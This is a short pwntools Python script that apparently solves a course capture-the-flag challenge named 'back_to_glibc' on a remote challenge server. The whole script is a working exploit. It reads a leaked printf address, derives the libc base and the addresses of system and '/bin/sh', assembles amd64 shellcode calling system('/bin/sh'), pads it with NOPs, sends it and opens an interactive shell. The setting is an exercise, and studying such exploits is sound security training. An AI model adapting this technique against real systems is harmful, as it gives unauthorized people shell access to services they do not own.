from pwn import *

# Define paths
binary_path = './back_to_glibc'
libc_path = './libc.so.6'

binary = ELF(binary_path)
libc = ELF(libc_path)

local_env = False
debug_mode = False

if local_env:
    conn = process(binary_path)
elif debug_mode:
    conn = gdb.debug(binary_path, gdbscript='b main\nc\n')
else:
    conn = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1292)
    conn.sendline(b"<NET ID>")

conn.recvuntil(b'This time you can have this one: ')
leaked_addr = u64(conn.recvline().strip().ljust(8, b'\x00'))

# Calculate libc base and target addresses
libc_base = leaked_addr - libc.symbols["printf"]
system_addr = libc_base + libc.symbols["system"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

# Construct shellcode
shellcode = asm(f"""
    sub rsp, 8                # Adjust stack
    mov rdi, {bin_sh_addr:#x} # "/bin/sh" location
    mov rax, {system_addr:#x} # system() location
    call rax                  # Execute system("/bin/sh")
""", arch="amd64")

payload = shellcode.ljust(0x50, b"\x90")  # NOP padding
conn.send(payload)
conn.interactive()
